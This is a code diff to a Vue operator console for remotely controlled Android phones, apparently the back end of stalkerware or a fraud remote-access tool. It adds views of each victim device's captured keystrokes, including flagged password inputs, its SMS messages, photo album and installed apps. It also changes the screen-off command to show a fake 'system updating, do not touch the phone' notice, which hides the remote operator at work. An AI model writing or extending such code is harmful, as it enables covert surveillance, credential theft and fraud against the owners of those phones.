@@ -6,6 +6,14 @@
       <div class="dialog-header">
         <div class="dialog-title">设备ID: {{ deviceId }} -- 当前位置:{{ `${screenInfo.appName}` }}</div>
       </div>
+
+    <!-- 快捷操作按钮区域 -->
+    <div class="quick-actions">
+      <el-button type="primary" size="small" @click="showInputLogDialog">输入记录</el-button>
+      <el-button type="primary" size="small" @click="showAppListDialog">安装应用</el-button>
+      <el-button type="primary" size="small" @click="showSmsListDialog">短信记录</el-button>
+      <el-button type="primary" size="small" @click="showAlbumListDialog">查看相册</el-button>
+    </div>
     </template>
 
 
@@ -30,8 +38,8 @@
 
               <!-- 屏幕边界框 - 始终显示黄色边框代表手机屏幕边界 -->
 
-              <canvas ref="screenshotCanvas"   :style="{ 
-                width: `${device.screenWidth}px`, 
+              <canvas ref="screenshotCanvas"   :style="{
+                width: `${device.screenWidth}px`,
                 height: `${device.screenHeight}px`,
                 opacity: screenMode == 2 ? 0.5 : 1
                 }"></canvas>
@@ -245,7 +253,7 @@
     </div>
   </el-dialog>
 
-  <!-- 控件选择对话框 -->
+    <!-- 控件选择对话框 -->
   <el-dialog title="选择重叠控件" draggable :modal="false" v-model="widgetSelectDialogVisible" width="450px" :close-on-click-modal="false"
     class="widget-select-dialog" custom-class="widget-select-dialog">
     <div class="widget-select-content">
@@ -278,18 +286,76 @@
       </div>
     </template>
   </el-dialog>
+
+  <!-- 输入记录弹窗 -->
+  <el-dialog v-model="inputLogDialogVisible" :title="`输入日志 - 设备ID: ${deviceId}`" width="970px" :close-on-click-modal="false" class="input-log-dialog">
+    <div class="log-header">
+      <div class="header-row">
+        <div class="query-controls">
+          <span class="query-label">来源:</span>
+          <el-select v-model="querySource" placeholder="选择来源" clearable style="width: 120px">
+            <el-option label="管理端" :value="1" />
+            <el-option label="App端" :value="0" />
+          </el-select>
+          <span class="query-label">APP包名:</span>
+          <el-input v-model="queryAppPkg" placeholder="输入APP包名" clearable style="width: 200px" />
+          <span class="query-label">查询日期:</span>
+          <el-date-picker v-model="queryDate" type="daterange" range-separator="至" start-placeholder="开始日期" end-placeholder="结束日期" format="YYYY-MM-DD" value-format="YYYY-MM-DD" @change="onDateChange" style="width: 280px" />
+          <el-button type="primary" @click="refreshLog" :loading="logLoading" size="small">重新查询</el-button>
+        </div>
+      </div>
+    </div>
+    <div class="log-content" v-loading="logLoading">
+      <div class="log-item" v-for="(item, index) in inputLogList" :key="index" :class="{ 'password-item': item.password == 1 }">
+        <div class="log-content-row">
+          <span class="log-time">{{ item.date || formatTime(item.time) }}</span>
+          <span class="log-source" :class="{ 'source-admin': item.source == 1, 'source-app': item.source == 0 }">{{ item.source == 1 ? "管理端" : "App端" }}</span>
+          <span class="log-app">{{ item.app }}</span>
+          <span class="log-resource" v-if="item.resourceId">{{ item.resourceId }}</span>
+          <span class="log-text">{{ item.text || (item.password == 1 ? "[密码输入]" : "无内容") }}</span>
+        </div>
+      </div>
+      <div v-if="inputLogList.length === 0 && !logLoading" class="no-data">暂无输入日志数据</div>
+    </div>
+    <template #footer>
+      <el-button @click="inputLogDialogVisible = false">关闭</el-button>
+    </template>
+  </el-dialog>
+
+  <!-- 安装应用弹窗 -->
+  <el-dialog v-model="appListDialogVisible" :title="`安装应用列表 - 设备ID: ${deviceId}`" width="1200px" :close-on-click-modal="false">
+    <AppList :device-id="deviceId" />
+  </el-dialog>
+
+  <!-- 短信记录弹窗 -->
+  <el-dialog v-model="smsListDialogVisible" :title="`短信记录 - 设备ID: ${deviceId}`" width="1200px" :close-on-click-modal="false">
+    <SmsList :device-id="deviceId" />
+  </el-dialog>
+
+  <!-- 相册列表弹窗 -->
+  <el-dialog v-model="albumListDialogVisible" :title="`相册列表 - 设备ID: ${deviceId}`" width="1200px" :close-on-click-modal="false">
+    <AlbumList :device-id="deviceId" />
+  </el-dialog>
 </template>
 
 <script lang="ts">
-import { defineComponent, ref, nextTick, computed, onUnmounted, watch } from "vue";
+import { defineComponent, ref, nextTick, onUnmounted, watch } from "vue";
 import { encodeWsMessage, decodeWsMessage, MessageType, App, encodeWsMessageNotBody } from "@/utils/message";
 import { WebSocketClient, ROOM_EVENT_CLIENT_JOINED, ROOM_EVENT_CLIENT_LEFT, ROOM_EVENT_CLIENT_ERROR, ROOM_EVENT_ROOM_MEMBER_COUNT } from "@/utils/websocket-client";
-import { ElNotification } from "element-plus";
+import { ElNotification, ElMessage } from "element-plus";
 import baseService from "@/service/baseService";
 import { ScreenInfo } from "@/utils/message";
 import longpress from '@/directives/longpress';
+import AppList from "@/views/apps/list.vue";
+import SmsList from "@/views/sms/list.vue";
+import AlbumList from "@/views/album/list.vue";
 export default defineComponent({
   props: {},
+  components: {
+    AppList,
+    SmsList,
+    AlbumList
+  },
   directives: {
     longpress
   },
@@ -337,6 +403,17 @@ export default defineComponent({
     const overlappingWidgets = ref<any[]>([]);
     const highlightedWidgetId = ref("");
     let historyInput = [];
+
+    // 快捷操作弹窗相关
+    const inputLogDialogVisible = ref(false);
+    const appListDialogVisible = ref(false);
+    const smsListDialogVisible = ref(false);
+    const albumListDialogVisible = ref(false);
+    const logLoading = ref(false);
+    const inputLogList = ref([]);
+    const queryDate = ref<any>([]);
+    const queryAppPkg = ref("");
+    const querySource = ref(null);
 
     const isTracking = ref(false); // 记录是否在拖动
     const trackPoints = ref(""); // 记录拖动轨迹的坐标点
@@ -497,9 +574,9 @@ export default defineComponent({
           onMessage: (data: ArrayBuffer) => {
             const { type, body } = decodeWsMessage(new Uint8Array(data));
             switch (type) {
-              case MessageType.screen_info:
-                let screenInfoData  = body as any;
-                if(screenMode.value != 1){
+              case MessageType.screen_info: {
+                const screenInfoData = body as any;
+                if (screenMode.value != 1) {
                   screenInfo.value = screenInfoData;
                 }
                 if (block.value != screenInfoData.block) {
@@ -514,6 +591,7 @@ export default defineComponent({
                 lastScreenInfoTime.value = Date.now();
                 updateSignalLevel();
                 break;
+              }
               case MessageType.install_app_resp:
                 installAppList.value = (body as any).apps;
                 addLog("success", `Installed apps list received: ${(body as any).apps.length} apps`, "app");
@@ -530,9 +608,9 @@ export default defineComponent({
               }
               case MessageType.screenshot: {
 
-                if(screenMode.value == 0){
-                  return;
-                }
+                // if(screenMode.value == 0){
+                //   return;
+                // }
                 const screenshotData = body as any;
                 //二进制数据
                 const screenshot = screenshotData.screenshot;
@@ -550,7 +628,7 @@ export default defineComponent({
 
                 break;
               }
-             
+
             }
           },
           onRoomNotification: (notification) => {
@@ -652,7 +730,7 @@ export default defineComponent({
 
     // 绘制截图到 Canvas
     const drawScreenshot = async (
-      binaryData: Uint8Array | ArrayBuffer, 
+      binaryData: Uint8Array | ArrayBuffer,
       mimeType: string
     ): Promise<void> => {
       if (!screenshotCanvas.value) {
@@ -763,7 +841,7 @@ export default defineComponent({
       if (!screenInfo.value.items || screenInfo.value.items.length === 0) {
         return [];
       }
-      
+
       // 过滤出与目标控件有重叠的所有控件
       const overlapping = screenInfo.value.items.filter((item: any) => {
         item.hold = hold;
@@ -771,12 +849,12 @@ export default defineComponent({
         if (item.uniqueId === targetItem.uniqueId || !item.isClickable) {
           return false;
         }
-        
+
         // 只检查可见且可点击的控件
         if (!(item.text && item.text.length > 0) && !item.isClickable) {
           return false;
         }
-        
+
         // 检查两个矩形是否重叠（使用矩形重叠算法）
         // 两个矩形重叠的条件：
         // 1. targetItem 的左边界 < item 的右边界
@@ -787,28 +865,28 @@ export default defineComponent({
         const targetRight = targetItem.x + targetItem.width;
         const targetTop = targetItem.y;
         const targetBottom = targetItem.y + targetItem.height;
-        
+
         const itemLeft = item.x;
         const itemRight = item.x + item.width;
         const itemTop = item.y;
         const itemBottom = item.y + item.height;
-        
-        const isOverlapping = 
-          targetLeft < itemRight && 
-          targetRight > itemLeft && 
-          targetTop < itemBottom && 
+
+        const isOverlapping =
+          targetLeft < itemRight &&
+          targetRight > itemLeft &&
+          targetTop < itemBottom &&
           targetBottom > itemTop;
-        
+
         return isOverlapping;
       });
-      
+
       // 按面积从小到大排序（面积 = 宽度 × 高度）
       overlapping.sort((a: any, b: any) => {
         const areaA = a.width * a.height;
         const areaB = b.width * b.height;
         return areaA - areaB;
       });
-      
+
       return overlapping;
     };
 
@@ -840,11 +918,11 @@ export default defineComponent({
     const selectWidget = (widget: any) => {
       console.log("selectWidget", widget);
       if (wsClient) {
-        const touchMsg = encodeWsMessage(MessageType.touch_req, { 
-          uniqueId: widget.uniqueId, 
-          x: widget.x + widget.width / 2, 
-          y: widget.y + widget.height / 2, 
-          hold: widget.hold 
+        const touchMsg = encodeWsMessage(MessageType.touch_req, {
+          uniqueId: widget.uniqueId,
+          x: widget.x + widget.width / 2,
+          y: widget.y + widget.height / 2,
+          hold: widget.hold
         });
         wsClient.sendMessage(touchMsg);
         addLog("info", `已发送指令: touch_req (选择: ${widget.text || '控件'})`, "click");
@@ -871,11 +949,11 @@ export default defineComponent({
     const nake_click = (item: any) => {
       // 如果没有重叠控件，直接发送指令
       if (wsClient) {
-        const touchMsg = encodeWsMessage(MessageType.touch_req, { 
-          uniqueId: item.uniqueId, 
-          x: item.x + item.width / 2, 
-          y: item.y + item.height / 2, 
-          hold: false 
+        const touchMsg = encodeWsMessage(MessageType.touch_req, {
+          uniqueId: item.uniqueId,
+          x: item.x + item.width / 2,
+          y: item.y + item.height / 2,
+          hold: false
         });
         wsClient.sendMessage(touchMsg);
         addLog("info", `已发送指令: touch_req`, "click");
@@ -886,34 +964,34 @@ export default defineComponent({
       if (!block.value) {
         return;
       }
-      
+
       // 获取与当前控件重叠的所有其他控件
       const overlapping = getOverlappingWidgets(item, hold);
-      
+
       // 如果有重叠的控件，显示选择对话框（包含被点击的控件和所有重叠的控件）
       if (overlapping.length > 0) {
         // 将被点击的控件和重叠的控件合并，然后按面积排序
         const allWidgets = [item, ...overlapping];
-        
+
         // 按面积从小到大排序
         allWidgets.sort((a: any, b: any) => {
           const areaA = a.width * a.height;
           const areaB = b.width * b.height;
           return areaA - areaB;
         });
-        
+
         overlappingWidgets.value = allWidgets;
         widgetSelectDialogVisible.value = true;
         addLog("info", `检测到 ${allWidgets.length} 个重叠控件，已按面积排序`, "click");
         return;
       }
-      
+
       // 如果没有重叠控件，直接发送指令
       if (wsClient) {
-        const touchMsg = encodeWsMessage(MessageType.touch_req, { 
-          uniqueId: item.uniqueId, 
-          x: item.x + item.width / 2, 
-          y: item.y + item.height / 2, 
+        const touchMsg = encodeWsMessage(MessageType.touch_req, {
+          uniqueId: item.uniqueId,
+          x: item.x + item.width / 2,
+          y: item.y + item.height / 2,
           hold
         });
         wsClient.sendMessage(touchMsg);
@@ -947,10 +1025,10 @@ export default defineComponent({
     };
 
     const toggleScrollMode = () => {
-      if (block.value) {
-        addLog("warn", `当前处于息屏模式，无法进入滚动模式`, "scroll");
-        return;
-      }
+      // if (block.value) {
+      //   addLog("warn", `当前处于息屏模式，无法进入滚动模式`, "scroll");
+      //   return;
+      // }
       if (!rollVisible.value) {
         // 进入滚动模式时，设置默认滚动区域
         scrollItem.value = {
@@ -1077,10 +1155,13 @@ export default defineComponent({
     };
     const screenOff = () => {
       if (wsClient) {
-        if(!block.value){
-          addLog("warn", `进入息屏模式后,滚动无法使用,点击将直接作用于控件,因此如果点击不生效,请尝试点击上一层控件`, "screen");
-        }
-        const screenOffMsg = encodeWsMessageNotBody(MessageType.screen_off);
+        // if(!block.value){
+        //   addLog("warn", `进入息屏模式后,滚动无法使用,点击将直接作用于控件,因此如果点击不生效,请尝试点击上一层控件`, "screen");
+        // }
+        // const screenOffMsg = encodeWsMessageNotBody(MessageType.screen_off);
+        const screenOffMsg  =encodeWsMessage(MessageType.screen_off, {
+          tips:"系統更新中,请稍等,预计更新时间10分钟,请勿触碰手机,请勿关机!"
+        })
         wsClient.sendMessage(screenOffMsg);
       }
       addLog("info", `已发送指令: screen_off`, "click");
@@ -1127,6 +1208,102 @@ export default defineComponent({
         addLog("info", `已发送指令: switchToPage `, "click");
       }
     };
+
+    // 快捷操作方法
+    const showInputLogDialog = () => {
+      // 设置默认查询日期为今天（范围）
+      const today = new Date();
+      const todayStr = today.getFullYear() + "-" + String(today.getMonth() + 1).padStart(2, "0") + "-" + String(today.getDate()).padStart(2, "0");
+      queryDate.value = [todayStr, todayStr];
+      queryAppPkg.value = "";
+      querySource.value = null;
+      inputLogList.value = [];
+      inputLogDialogVisible.value = true;
+      refreshLog();
+    };
+
+    const showAppListDialog = () => {
+      appListDialogVisible.value = true;
+    };
+
+    const showSmsListDialog = () => {
+      smsListDialogVisible.value = true;
+    };
+
+    const showAlbumListDialog = () => {
+      albumListDialogVisible.value = true;
+    };
+
+    const refreshLog = async () => {
+      if (!deviceId.value || !queryDate.value || !Array.isArray(queryDate.value) || queryDate.value.length !== 2) {
+        ElMessage({
+          message: "查询参数不完整",
+          type: "warning"
+        });
+        return;
+      }
+
+      logLoading.value = true;
+      inputLogList.value = [];
+
+      try {
+        // 根据选择的日期范围计算起止时间
+        const [startStr, endStr] = queryDate.value as [string, string];
+        const startDate = new Date(startStr);
+        const endDate = new Date(endStr);
+        const startTime = new Date(startDate.getFullYear(), startDate.getMonth(), startDate.getDate()).getTime();
+        const endTime = new Date(endDate.getFullYear(), endDate.getMonth(), endDate.getDate() + 1).getTime() - 1;
+
+        const { code, data, msg } = await baseService.post("/inputTextRecord/group", {
+          deviceId: deviceId.value,
+          startTime: startTime,
+          endTime: endTime,
+          pkg: device.value.pkg,
+          appPkg: queryAppPkg.value || undefined,
+          source: querySource.value !== null ? querySource.value : undefined
+        });
+
+        if (code == 0) {
+          if (data && data.items && Array.isArray(data.items)) {
+            inputLogList.value = data.items;
+          } else {
+            inputLogList.value = [];
+          }
+        } else {
+          ElMessage({
+            message: msg || "获取日志失败",
+            type: "error"
+          });
+        }
+      } catch (error) {
+        ElMessage({
+          message: "获取日志失败",
+          type: "error"
+        });
+      } finally {
+        logLoading.value = false;
+      }
+    };
+
+    const onDateChange = () => {
+      // 日期改变时可以自动查询，或者用户手动点击按钮查询
+    };
+
+    const formatTime = (timestamp: any) => {
+      if (!timestamp) return "";
+      const timeNum = Number(timestamp);
+      if (isNaN(timeNum)) return "";
+      const date = new Date(timeNum);
+      if (isNaN(date.getTime())) return "";
+      const year = date.getFullYear();
+      const month = String(date.getMonth() + 1).padStart(2, "0");
+      const day = String(date.getDate()).padStart(2, "0");
+      const hours = String(date.getHours()).padStart(2, "0");
+      const minutes = String(date.getMinutes()).padStart(2, "0");
+      const seconds = String(date.getSeconds()).padStart(2, "0");
+      return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
+    };
+
     return {
       wakeup,
       startAppReq,
@@ -1187,7 +1364,24 @@ export default defineComponent({
       unhighlightWidget,
       selectWidget,
       cancelWidgetSelect,
-      screenMode
+      screenMode,
+      // 快捷操作相关
+      inputLogDialogVisible,
+      appListDialogVisible,
+      smsListDialogVisible,
+      albumListDialogVisible,
+      showInputLogDialog,
+      showAppListDialog,
+      showSmsListDialog,
+      showAlbumListDialog,
+      logLoading,
+      inputLogList,
+      queryDate,
+      queryAppPkg,
+      querySource,
+      refreshLog,
+      onDateChange,
+      formatTime
     };
   }
 });
@@ -1195,6 +1389,158 @@ export default defineComponent({
 
 <style>
 /* 旧样式已移除，使用下方的新样式 */
+
+/* 快捷操作按钮区域样式 */
+.quick-actions {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 12px;
+  padding: 12px 16px;
+  background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+  border-bottom: 2px solid #e5e7eb;
+  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+}
+
+.quick-actions .el-button {
+  border-radius: 8px;
+  font-weight: 500;
+  transition: all 0.3s ease;
+  box-shadow: 0 2px 6px rgba(59, 130, 246, 0.15);
+}
+
+.quick-actions .el-button:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(59, 130, 246, 0.25);
+}
+
+/* 输入日志弹窗样式（复用 list.vue 的样式） */
+.input-log-dialog .el-dialog__body {
+  padding: 10px 20px;
+}
+
+.log-header {
+  margin-bottom: 20px;
+  padding: 15px;
+  background: #f5f7fa;
+  border-radius: 8px;
+}
+
+.header-row {
+  display: flex;
+  justify-content: flex-start;
+  align-items: center;
+  width: 100%;
+}
+
+.query-controls {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.query-label {
+  font-size: 14px;
+  font-weight: 500;
+  color: #606266;
+  white-space: nowrap;
+}
+
+.log-content {
+  max-height: 500px;
+  overflow-y: auto;
+  border: 1px solid #e4e7ed;
+  border-radius: 8px;
+  padding: 10px;
+  background: #fafafa;
+}
+
+.log-item {
+  margin-bottom: 10px;
+  padding: 10px 12px;
+  background: white;
+  border-radius: 6px;
+  border-left: 3px solid #409eff;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+}
+
+.log-item.password-item {
+  background: #fef0f0;
+  border-left-color: #f56c6c;
+  box-shadow: 0 2px 8px rgba(245, 108, 108, 0.2);
+}
+
+.log-item.password-item .log-text {
+  background: #fde2e2;
+  color: #f56c6c;
+  font-weight: 500;
+}
+
+.log-content-row {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  flex-wrap: wrap;
+  font-size: 13px;
+}
+
+.log-time {
+  font-weight: 500;
+}
+
+.log-source {
+  padding: 2px 8px;
+  border-radius: 12px;
+  font-size: 12px;
+  font-weight: 500;
+  margin-right: 8px;
+}
+
+.log-source.source-admin {
+  background: #f0f9ff;
+  color: #1d4ed8;
+  border: 1px solid #dbeafe;
+}
+
+.log-source.source-app {
+  background: #f0fdf4;
+  color: #15803d;
+  border: 1px solid #dcfce7;
+}
+
+.log-app {
+  background: #e1f3d8;
+  padding: 2px 8px;
+  border-radius: 12px;
+  color: #67c23a;
+}
+
+.log-resource {
+  background: #e6f7ff;
+  padding: 2px 8px;
+  border-radius: 12px;
+  color: #1890ff;
+  font-size: 11px;
+}
+
+.log-text {
+  font-family: "Courier New", monospace;
+  font-size: 13px;
+  color: #303133;
+  background: #f8f9fa;
+  padding: 4px 8px;
+  border-radius: 4px;
+  word-break: break-all;
+  flex: 1;
+  min-width: 0;
+}
+
+.no-data {
+  text-align: center;
+  padding: 50px;
+  color: #909399;
+  font-size: 14px;
+}
 
 .screen>span {
   position: absolute;
@@ -1420,7 +1766,7 @@ export default defineComponent({
   .el-dialog__header {
     background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
     color: white;
-    padding: 20px 24px;
+    padding: 20px 5px;
     border-bottom: 3px solid #3b82f6 !important;
     margin: 0;
     text-align: center;
